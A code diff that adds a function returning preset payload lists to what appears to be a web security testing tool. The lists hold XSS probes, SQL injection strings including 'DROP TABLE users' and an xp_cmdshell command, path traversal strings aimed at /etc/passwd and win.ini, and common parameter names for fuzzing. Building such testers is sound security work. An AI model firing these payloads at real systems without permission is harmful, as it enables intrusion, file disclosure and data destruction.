@@ -576,3 +576,66 @@ export function parseMultipartFormData(postData) {
 
   });
 }
+
+export function getPresetPayloads(name) {
+  const presets = {
+    xss: [
+      '<script>alert(1)</script>',
+      '"><script>alert(1)</script>',
+      'javascript:alert(1)',
+      '<img src=x onerror=alert(1)>',
+      '"><img src=x onerror=alert(1)>',
+      '{{7*7}}',
+      '${7*7}',
+      '<svg/onload=alert(1)>',
+    ],
+    sqli: [
+      "' OR '1'='1",
+      "' UNION SELECT NULL--",
+      "'; DROP TABLE users--",
+      "1' OR '1'='1'/*",
+      "1' AND SLEEP(5)--",
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "'; EXEC xp_cmdshell('dir')--",
+    ],
+    path: [
+      '../../../../etc/passwd',
+      '..\\..\\..\\windows\\win.ini',
+      '../../../../etc/hosts',
+      '%2e%2e%2f%2e%2e%2fetc/passwd',
+      '....//....//....//etc/passwd',
+    ],
+    common: [
+      'id',
+      'user',
+      'username',
+      'email',
+      'name',
+      'token',
+      'key',
+      'api_key',
+      'auth',
+      'password',
+      'secret',
+      'file',
+      'path',
+      'url',
+      'redirect',
+      'return',
+      'next',
+      'goto',
+      'page',
+      'limit',
+      'offset',
+      'sort',
+      'order',
+      'search',
+      'query',
+      'q',
+      'lang',
+      'locale',
+    ]
+  };
+  return presets[name] || [];
+}
